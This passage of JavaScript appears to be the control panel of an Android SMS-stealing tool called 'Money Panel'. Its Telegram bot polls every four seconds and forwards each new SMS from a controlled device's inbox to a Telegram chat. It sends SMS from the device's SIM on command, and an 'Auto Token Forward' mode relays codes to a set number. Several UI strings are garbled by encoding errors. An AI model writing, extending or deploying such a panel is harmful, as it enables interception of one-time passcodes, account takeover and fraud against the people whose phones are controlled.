    dot.classList.add('online');
    txt.textContent = 'Bot Online â€” polling every 4s';
    if (btn) { btn.textContent = 'â¹ Stop Bot'; btn.classList.add('running'); }
  } else {
    dot.classList.remove('online');
    txt.textContent = 'Bot Offline';
    if (btn) { btn.textContent = 'â–¶ Start Bot'; btn.classList.remove('running'); }
  }
  if (cnt && sentCount !== undefined) cnt.textContent = sentCount + ' sent';
}

function selectBotSim(n) {
  _botSim = n;
  [1, 2].forEach(function(i) {
    var b = document.getElementById('bot-sim-' + i);
    if (b) b.classList.toggle('active', i === n);
  });
}
function selectBotRepeat(n) {
  _botRepeat = n;
  [1, 2, 3].forEach(function(i) {
    var b = document.getElementById('bot-rpt-' + i);
    if (b) b.classList.toggle('active', i === n);
  });
}

function saveBotConfig() {
  var dev = STATE.detailDev;
  if (!dev) { showToast('Open a device first'); return; }
  var tokenEl  = document.getElementById('bot-token');
  var chatEl   = document.getElementById('bot-chat-id');
  var fmtEl    = document.getElementById('bot-format');
  var afNumEl  = document.getElementById('bot-autofwd-num');
  var afTplEl  = document.getElementById('bot-autofwd-tpl');
  var token    = tokenEl  ? tokenEl.value.trim()  : '';
  var chatId   = chatEl   ? chatEl.value.trim()   : '';
  var fmt      = fmtEl    ? fmtEl.value           : 'auto';
  var afNum    = afNumEl  ? afNumEl.value.trim()  : '';
  var afTpl    = afTplEl  ? afTplEl.value.trim()  : '';
  if (!token)  { showToast('Enter your Bot Token first'); return; }
  if (!chatId) { showToast('Enter the Telegram Chat ID'); return; }
  setBotCfg(dev.id, { token: token, chatId: chatId, format: fmt, sim: _botSim, repeat: _botRepeat, autoFwdNum: afNum, autoFwdTpl: afTpl });
  showToast('\u2713 Config saved!');
  var mode = afNum ? 'Auto-Token-Fwd \u2192 ' + afNum : 'SMS-Request mode';
  botLog('info', 'Config saved \u2014 ' + mode + ' \u00b7 fmt: ' + fmt);
}

function loadBotTabUI() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var cfg = getBotCfg(dev.id);
  var tokenEl  = document.getElementById('bot-token');
  var chatEl   = document.getElementById('bot-chat-id');
  var fmtEl    = document.getElementById('bot-format');
  var afNumEl  = document.getElementById('bot-autofwd-num');
  var afTplEl  = document.getElementById('bot-autofwd-tpl');
  if (tokenEl) tokenEl.value = cfg.token || '';
  if (chatEl)  chatEl.value  = cfg.chatId || '';
  if (fmtEl)   { fmtEl.value = cfg.format || 'auto'; fmtEl.onchange = updateFormatPreview; }
  if (afNumEl) afNumEl.value = cfg.autoFwdNum || '';
  if (afTplEl) afTplEl.value = cfg.autoFwdTpl || '';
  selectBotSim(cfg.sim || 1);
  selectBotRepeat(cfg.repeat || 1);
  updateBotStatusUI(!!_botTimers[dev.id], cfg.sentCount || 0);
  updateFormatPreview();
}

// -- Main monitor tick (4s, mirrors bot.py asyncio.sleep(4)) ------------------
// Wrapped in try/catch: any error logs to bot log but does NOT kill the interval
// _botRunning lock prevents overlapping async ticks
async function _botTick(deviceId) {
  if (_botRunning[deviceId]) return;  // previous tick still running, skip
  _botRunning[deviceId] = true;
  try {
  var cfg = getBotCfg(deviceId);
  if (!cfg.token || !cfg.chatId) { stopBot(deviceId); return; }

  var curOffset = cfg.offset || 0;

  // Direction 1: Telegram -> SMS  (bot.py: grp_handler + channel_post)
  var updates = await tgGetUpdates(cfg.token, curOffset);
  var newOffset = curOffset;

  for (var i = 0; i < updates.length; i++) {
    var upd = updates[i];
    if (upd.update_id >= newOffset) newOffset = upd.update_id + 1;

    // bot.py: channel_post() + message(group/supergroup)
    var msg = upd.message || upd.channel_post;
    if (!msg) continue;

    // Only process messages from OUR configured chat (mirrors grp_handler filter)
    var msgChatId = String(msg.chat && msg.chat.id);
    if (msgChatId !== String(cfg.chatId)) continue;

    var text = msg.text || msg.caption || '';
    if (!text) continue;

    // DEBUG: log EVERY message received so user can see if bot is getting updates
    botLog('info', '\ud83d\udcec Received [' + (msg.chat.type || '?') + ']: ' + text.replace(/\n/g, ' ').slice(0, 60));

    // ── Auto Token Forward mode ──────────────────────────────────────────────
    // If user has configured a target number, ANY message from the watched chat
    // is sent as SMS to that number (mirrors "auto token sender" from bot.py)
    if (cfg.autoFwdNum) {
      var msgToSend = cfg.autoFwdTpl
        ? cfg.autoFwdTpl.replace('{token}', text).replace('{msg}', text)
        : text;
      botLog('info', '\ud83d\udd04 AutoFwd \u2192 ' + cfg.autoFwdNum + ': ' + msgToSend.slice(0, 40));
      var afOk = false;
      for (var rr = 0; rr < (cfg.repeat || 1); rr++) {
        if (await botSendSms(deviceId, cfg.sim || 1, cfg.autoFwdNum, msgToSend)) afOk = true;
        if (rr < (cfg.repeat || 1) - 1) await new Promise(function(r){ setTimeout(r, 1200); });
      }
      await tgSend(cfg.token, cfg.chatId,
        (afOk ? '\u2705' : '\u274c') + ' <b>Token Forwarded</b>\n' +
        '\ud83d\udcde To: <code>' + cfg.autoFwdNum + '</code>\n' +
        '\ud83d\udcac <code>' + msgToSend.slice(0, 80) + '</code>'
      );
      continue;  // Don't also try to parse as SMS request
    }

    // ── SMS Request mode (To: / Message: format) ──────────────────────────────
    // Parse using the format the USER selected in the UI
    var parsed = parseTgSmsRequest(text, cfg.format || 'auto');
    if (!parsed) {
      botLog('info', '\u26a0\ufe0f No format match \u2014 check format setting or switch to Auto');
      continue;
    }

    botLog('info', '\ud83d\udce8 Request: To=' + parsed.to);

    // Send (repeat x times, bot.py: _do_send — 1.2s delay between each)
    // Delay is critical: PUT overwrites same path, APK needs time to process before next
    var ok = false;
    for (var rpt = 0; rpt < (cfg.repeat || 1); rpt++) {
      var sent = await botSendSms(deviceId, cfg.sim || 1, parsed.to, parsed.msg);
      if (sent) ok = true;
      if (rpt < (cfg.repeat || 1) - 1) await new Promise(function(r){ setTimeout(r, 1200); });
    }

    cfg.sentCount = (cfg.sentCount || 0) + (ok ? 1 : 0);

    if (ok) {
      botLog('ok', '\u2713 SMS fired \u2192 ' + parsed.to + ' (SIM' + (cfg.sim||1) + ' \u00d7' + (cfg.repeat||1) + ')');
      await tgSend(cfg.token, cfg.chatId,
        '\u2705 <b>SMS Sent</b>\n\n' +
        '\ud83d\udcde To: <code>' + parsed.to + '</code>\n' +
        '\ud83d\udcac Msg: <code>' + parsed.msg.slice(0, 80) + (parsed.msg.length > 80 ? '\u2026' : '') + '</code>\n' +
        '\ud83d\udcf6 SIM' + (cfg.sim||1) + ' \u00d7' + (cfg.repeat||1)
      );
    } else {
      botLog('err', '\u2717 Send failed \u2192 ' + parsed.to);
      await tgSend(cfg.token, cfg.chatId,
        '\u274c <b>Send Failed</b>\n\ud83d\udcde To: <code>' + parsed.to + '</code>\n<i>Device may be offline or Firebase error</i>'
      );
    }
  }

  // Direction 2: Device SMS -> Telegram  (bot.py: monitor_worker inbox)
  var smsList   = await botFetchSms(deviceId);
  var seenSet   = new Set(cfg.seenSmsKeys || []);
  var newSms    = smsList.filter(function(s) { return !seenSet.has(s.key) && s.body; });

  for (var j = 0; j < newSms.length; j++) {
    var sms = newSms[j];
    seenSet.add(sms.key);
    await tgSend(cfg.token, cfg.chatId,
      '\ud83d\udcf1 <b>New Device SMS</b>\n\n' +
      '\ud83d\udcde From: <code>' + sms.sender + '</code>\n' +
      '\ud83d\udcac <code>' + sms.body.slice(0, 300) + '</code>'
    );
    botLog('fwd', '\u2192 Fwd SMS from ' + sms.sender + ': ' + sms.body.slice(0, 40) + '\u2026');
  }

  var finalSeen = Array.from(seenSet).slice(-500);
  setBotCfg(deviceId, { offset: newOffset, seenSmsKeys: finalSeen, sentCount: cfg.sentCount || 0 });
  updateBotStatusUI(true, cfg.sentCount || 0);
  } catch(e) {
    // Log error but keep interval alive — bot survives transient errors
    botLog('err', '\u26a0\ufe0f Tick error: ' + String(e).slice(0, 80) + ' \u2014 retrying in 4s');
  } finally {
    _botRunning[deviceId] = false;  // always release lock
  }
}

// -- Start / Stop -------------------------------------------------------------
function startBot(deviceId) {
  if (_botTimers[deviceId]) return;
  var cfg = getBotCfg(deviceId);
  if (!cfg.token)  { showToast('Enter your Bot Token first'); return; }
  if (!cfg.chatId) { showToast('Save a Chat ID first'); return; }

  (async function() {
    botLog('info', '\ud83d\udd0c Connecting to Telegram\u2026');
    var me = await tgGetMe(cfg.token);
    if (!me) {
      botLog('err', '\u2717 Token invalid or conflict \u2014 is bot.py running with same token? Use a DIFFERENT bot token.');
      showToast('Token error \u2014 see log');
      updateBotStatusUI(false, cfg.sentCount || 0);
      return;
    }
    botLog('ok', '\u2713 Bot alive: @' + me.username + ' (' + me.first_name + ')');

    // Seed existing SMS (mirrors monitor_worker: skip messages already on device)
    botLog('info', 'Seeding existing SMS\u2026');
    var existing = await botFetchSms(deviceId);
    var keys = existing.map(function(s) { return s.key; });
    setBotCfg(deviceId, { seenSmsKeys: keys, enabled: true });
    botLog('info', 'Seeded ' + keys.length + ' SMS (skipped) \u00b7 watching chat ' + cfg.chatId);

    // Announce (mirrors bot.py main() owner notify)
    await tgSend(cfg.token, cfg.chatId,
      '🟢 <b>Money Panel Bot Started</b>\n\n' +
      '📱 Device: <code>' + deviceId + '</code>\n' +
      '📶 SIM' + (cfg.sim||1) + ' · Repeat: ×' + (cfg.repeat||1) + '\n' +
      '🔄 Format: ' + (cfg.format || 'auto') + '\n\n' +
      '<i>Watching for SMS requests…</i>'
    );

    // 4s polling loop (mirrors asyncio.sleep(4))
    _botTimers[deviceId] = setInterval(function() { _botTick(deviceId); }, 4000);
    updateBotStatusUI(true, getBotCfg(deviceId).sentCount || 0);
  })();
}

function stopBot(deviceId) {
  if (_botTimers[deviceId]) {
    clearInterval(_botTimers[deviceId]);
    delete _botTimers[deviceId];
  }
  delete _botRunning[deviceId];  // release tick lock
  var cfg = getBotCfg(deviceId);
  if (cfg.token && cfg.chatId) {
    tgSend(cfg.token, cfg.chatId,
      '🔴 <b>Money Panel Bot Stopped</b>\n<i>Panel tab closed or bot manually stopped.</i>'
    );
  }
  setBotCfg(deviceId, { enabled: false });
  botLog('info', '\u23f8 Bot stopped');
  updateBotStatusUI(false, getBotCfg(deviceId).sentCount || 0);
}

function toggleBot() {
  var dev = STATE.detailDev;
  if (!dev) return;
  var tokenEl = document.getElementById('bot-token');
  var chatEl  = document.getElementById('bot-chat-id');
  var fmtEl   = document.getElementById('bot-format');
  var token   = tokenEl ? tokenEl.value.trim() : '';
  var chatId  = chatEl  ? chatEl.value.trim()  : '';
  var fmt     = fmtEl   ? fmtEl.value          : 'auto';
  if (!token)  { showToast('Enter your Bot Token first'); return; }
  if (!chatId) { showToast('Enter the Telegram Chat ID first'); return; }
  // Always persist latest UI values before toggling
  setBotCfg(dev.id, { token: token, chatId: chatId, format: fmt, sim: _botSim, repeat: _botRepeat });
  if (_botTimers[dev.id]) {
    stopBot(dev.id);
  } else {
    startBot(dev.id);
  }
}
